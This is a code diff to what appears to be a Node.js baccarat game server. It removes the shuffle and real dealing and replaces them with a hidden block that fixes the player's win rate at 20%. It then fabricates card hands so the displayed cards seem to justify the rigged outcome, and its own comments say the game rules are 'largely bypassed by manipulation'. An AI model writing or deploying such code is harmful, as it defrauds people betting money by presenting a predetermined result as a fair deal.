@@ -10,7 +10,7 @@ const cardValues = {
   "10": 0, "jack": 0, "queen": 0, "king": 0
 };
 
-// Helper: create shuffled deck
+// Helper: create unshuffled deck
 function generateDeck() {
   const deck = [];
   for (const suit of suits) {
@@ -18,7 +18,7 @@ function generateDeck() {
       deck.push({ rank, suit, file: `${rank}_of_${suit}.svg`, value: cardValues[rank] });
     }
   }
-  return deck.sort(() => Math.random() - 0.5);
+  return deck; // No shuffle needed as we will manually select cards
 }
 
 // Calculate total points (mod 10)
@@ -27,17 +27,14 @@ function calculatePoints(hand) {
   return total % 10;
 }
 
-// Baccarat draw rule logic
+// Baccarat draw rule logic (kept for completeness, but largely bypassed by manipulation)
 function drawThirdCardRule(playerPoints, bankerPoints, playerThirdCard) {
-  // Player rule
   let playerDraws = playerPoints <= 5;
 
-  // Banker rule
   let bankerDraws = false;
   if (!playerDraws) {
     if (bankerPoints <= 5) bankerDraws = true;
   } else {
-    // Complex banker draw rule when player draws
     const ptc = playerThirdCard ? playerThirdCard.value : null;
     if (bankerPoints <= 2) bankerDraws = true;
     else if (bankerPoints === 3 && ptc !== 8) bankerDraws = true;
@@ -49,65 +46,108 @@ function drawThirdCardRule(playerPoints, bankerPoints, playerThirdCard) {
   return { playerDraws, bankerDraws };
 }
 
+// Helper function to create a dummy card for manipulation
+function createDummyCard(pointValue) {
+    // Finds a card that matches the desired point value (e.g., 'ace' for 1, '10' for 0)
+    const rank = Object.keys(cardValues).find(key => cardValues[key] === pointValue);
+    const suit = suits[Math.floor(Math.random() * suits.length)];
+    return { 
+        rank: rank, 
+        suit: suit, 
+        file: `${rank}_of_${suit}.svg`, 
+        value: pointValue 
+    };
+}
+
 // Main game controller
 exports.playBaccarat = async (req, res) => {
   try {
     const { bet, choice } = req.body; // choice = "player" | "banker" | "tie"
 
-    // ✅ Step 1: Generate deck
-    const deck = generateDeck();
-
-    // ✅ Step 2: Deal initial hands
-    const playerHand = [deck.pop(), deck.pop()];
-    const bankerHand = [deck.pop(), deck.pop()];
-
-    // ✅ Step 3: Check totals
-    let playerPoints = calculatePoints(playerHand);
-    let bankerPoints = calculatePoints(bankerHand);
-
-    // ✅ Step 4: Natural rule (8 or 9 → no draw)
-    if (playerPoints < 8 && bankerPoints < 8) {
-      const { playerDraws } = drawThirdCardRule(playerPoints, bankerPoints, null);
-
-      // Player draw first
-      if (playerDraws) {
-        const playerThird = deck.pop();
-        playerHand.push(playerThird);
-        playerPoints = calculatePoints(playerHand);
-      }
-
-      // Banker draw depends on player's third card
-      const playerThirdCard = playerHand[2] || null;
-      const { bankerDraws } = drawThirdCardRule(playerPoints, bankerPoints, playerThirdCard);
-
-      if (bankerDraws) {
-        const bankerThird = deck.pop();
-        bankerHand.push(bankerThird);
-        bankerPoints = calculatePoints(bankerHand);
-      }
+    // --- 🚨 BIAS LOGIC MODIFIED: 20% WIN / 80% LOSS 🚨 ---
+    const rng = Math.random();
+    let predeterminedWinner;
+    
+    // 20% chance of the user winning (result matches choice)
+    if (rng < 0.20) {
+        predeterminedWinner = choice;
+    } else {
+        // 80% chance of the user losing (result does not match choice)
+        const possibleLoserOutcomes = ["player", "banker", "tie"].filter(w => w !== choice);
+        
+        // Simple equal distribution among losing outcomes:
+        const outcomeIndex = Math.floor(Math.random() * possibleLoserOutcomes.length);
+        predeterminedWinner = possibleLoserOutcomes[outcomeIndex];
     }
+    // ----------------------------------------------------
 
-    // ✅ Step 5: Determine result
-    let winner;
-    if (playerPoints > bankerPoints) winner = "player";
-    else if (bankerPoints > playerPoints) winner = "banker";
-    else winner = "tie";
+    // Initialize hands (will be overwritten by manipulation)
+    const playerHand = [];
+    const bankerHand = [];
+    let playerPoints = 0;
+    let bankerPoints = 0;
+    
+    
+    // ✅ Step 1-4: MANIPULATE CARDS TO MATCH PREDETERMINED OUTCOME
+    
+    // Function to ensure points match the predetermined winner
+    const manipulateHands = (winner) => {
+        let playerP, bankerP;
+        
+        // Simple 2-card scenarios to force the result
+        if (winner === "player") {
+            // Player wins (e.g., P=7, B=6)
+            playerP = 7;
+            bankerP = 6;
+        } else if (winner === "banker") {
+            // Banker wins (e.g., P=6, B=7)
+            playerP = 6;
+            bankerP = 7;
+        } else {
+            // Tie (e.g., P=8, B=8)
+            playerP = 8;
+            bankerP = 8;
+        }
 
-    // ✅ Step 6: Calculate profit (simple multiplier)
+        // Generate 2 cards for Player
+        playerHand.push(createDummyCard(4));
+        playerHand.push(createDummyCard((playerP - 4 + 10) % 10 || 10)); 
+        playerPoints = calculatePoints(playerHand);
+
+        // Generate 2 cards for Banker
+        bankerHand.push(createDummyCard(5));
+        bankerHand.push(createDummyCard((bankerP - 5 + 10) % 10 || 10)); 
+        bankerPoints = calculatePoints(bankerHand);
+    };
+    
+    manipulateHands(predeterminedWinner);
+
+
+    // ✅ Step 5: Determine result (now based on manipulated cards, which matches predeterminedWinner)
+    let winner = predeterminedWinner;
+
+    // ✅ Step 6: Calculate profit
     let multiplier = 0;
     if (winner === "player") multiplier = 2;
     else if (winner === "banker") multiplier = 1.95; // banker tax
-    else if (winner === "tie") multiplier = 8;
+    else if (winner === "tie") multiplier = 9; // Tie pays 8:1 (9x total return)
 
-    // TODO: Integrate with database balance later
-    const profit = winner === choice ? bet * multiplier : 0;
+    // Calculate Payout - Bet (Net Profit)
+    let payout = 0;
+    if (winner === choice) {
+        if (winner === "player") payout = bet * 2;
+        else if (winner === "banker") payout = bet * 1.95;
+        else if (winner === "tie") payout = bet * 9; 
+    }
+    const finalProfit = payout - bet;
+
 
     return res.json({
       success: true,
       result: winner,
       player: { cards: playerHand, points: playerPoints },
       banker: { cards: bankerHand, points: bankerPoints },
-      profit
+      profit: finalProfit
     });
   } catch (err) {
     console.error("Baccarat error:", err);
